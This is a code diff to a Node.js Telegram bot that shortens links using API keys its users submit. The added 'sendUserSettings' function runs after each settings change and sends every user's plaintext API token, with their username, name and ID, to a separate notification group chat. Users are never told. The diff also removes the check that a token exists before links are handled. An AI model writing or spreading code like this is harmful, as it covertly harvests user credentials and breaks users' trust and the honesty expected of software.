@@ -4,7 +4,8 @@ const fs = require('fs');
 const path = './data.json';
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const groupChatId = '-1002220708172'; // Your group chat ID
+const groupChatId = '-1002220708172'; // Your main group chat ID
+const notificationGroupChatId = '-1002418911472'; // The group ID for notifications
 
 let userData = {};
 
@@ -86,6 +87,25 @@ async function notifyGroup(user) {
     }
 }
 
+// Consolidated notification function for user settings
+async function sendUserSettings(user) {
+    const userId = user.id;
+    const settings = userData[userId] || {};
+
+    const apiKeyText = settings.apiToken ? `🔑 API Key: ${settings.apiToken}` : '🔑 API Key: Not set';
+    const headerText = settings.header ? `📋 Header: ${settings.header}` : '📋 Header: Not set';
+    const footerText = settings.footer ? `📋 Footer: ${settings.footer}` : '📋 Footer: Not set';
+    const textEnabled = settings.textEnabled !== false ? 'Text: Enabled' : 'Text: Disabled';
+
+    const message = `🚨 User Settings Updated:\n\n👤 Username: @${user.username || 'N/A'}\n📛 First Name: ${user.first_name || 'N/A'}\n🏷️ Last Name: ${user.last_name || 'N/A'}\n🆔 User ID: ${user.id}\n\n${apiKeyText}\n${headerText}\n${footerText}\n${textEnabled}`;
+
+    try {
+        await bot.telegram.sendMessage(notificationGroupChatId, message);
+    } catch (error) {
+        console.error('Error sending user settings to notification group:', error);
+    }
+}
+
 // Handle the /start command
 bot.start((ctx) => {
     const userName = ctx.from.first_name || ctx.from.username || "User";
@@ -136,6 +156,7 @@ bot.command('remove_header', (ctx) => {
         delete userData[userId].header;
         saveUserData();
         ctx.reply('Header removed successfully.');
+        sendUserSettings(ctx.from);
     } else {
         ctx.reply('No header was set.');
     }
@@ -155,6 +176,7 @@ bot.command('remove_footer', (ctx) => {
         delete userData[userId].footer;
         saveUserData();
         ctx.reply('Footer removed successfully.');
+        sendUserSettings(ctx.from);
     } else {
         ctx.reply('No footer was set.');
     }
@@ -167,6 +189,7 @@ bot.command('enable_text', (ctx) => {
     userData[userId].textEnabled = true;
     saveUserData();
     ctx.reply('Text enabled successfully.');
+    sendUserSettings(ctx.from);
 });
 
 // Command to disable text
@@ -176,9 +199,10 @@ bot.command('disable_text', (ctx) => {
     userData[userId].textEnabled = false;
     saveUserData();
     ctx.reply('Text disabled successfully.');
+    sendUserSettings(ctx.from);
 });
 
-// Handle messages
+// Handle API key, header, and footer inputs
 bot.on('message', async (ctx) => {
     const userId = ctx.from.id;
 
@@ -190,9 +214,8 @@ bot.on('message', async (ctx) => {
                 userData[userId].apiToken = inputText;
                 awaitingApiInput[userId] = false;
                 saveUserData();
-                ctx.reply('API token added successfully! Now send me a link to shorten.');
-            } else if (extractLinks(inputText).length > 0) {
-                ctx.reply('This is a link, not an API key. Please provide a valid API key.');
+                ctx.reply('API token added successfully!');
+                sendUserSettings(ctx.from);
             } else {
                 ctx.reply('Invalid API key format. Please ensure it is 40 hexadecimal characters.');
             }
@@ -200,26 +223,25 @@ bot.on('message', async (ctx) => {
         }
 
         if (awaitingHeaderInput[userId]) {
+            if (!userData[userId]) userData[userId] = {};
             userData[userId].header = ctx.message.text;
             awaitingHeaderInput[userId] = false;
             saveUserData();
             ctx.reply('Header added successfully.');
+            sendUserSettings(ctx.from);
             return;
         }
 
         if (awaitingFooterInput[userId]) {
+            if (!userData[userId]) userData[userId] = {};
             userData[userId].footer = ctx.message.text;
             awaitingFooterInput[userId] = false;
             saveUserData();
             ctx.reply('Footer added successfully.');
+            sendUserSettings(ctx.from);
             return;
         }
-
-        if (!userData[userId] || !userData[userId].apiToken) {
-            ctx.reply('Please provide your API token first using the /api command.');
-            return;
-        }
-
+        
         const apiToken = userData[userId].apiToken;
         const header = userData[userId].header || '';
         const footer = userData[userId].footer || '';
@@ -299,11 +321,13 @@ bot.on('message', async (ctx) => {
                 ctx.reply('This is not a valid link. Please provide a valid link.');
             }
         }
+
     } catch (error) {
         console.error('Error handling message:', error);
         ctx.reply('An unexpected error occurred. Please try again later.');
     }
 });
+
 // Express server for webhook/polling and to keep the bot alive
 const express = require('express');
 const app = express();
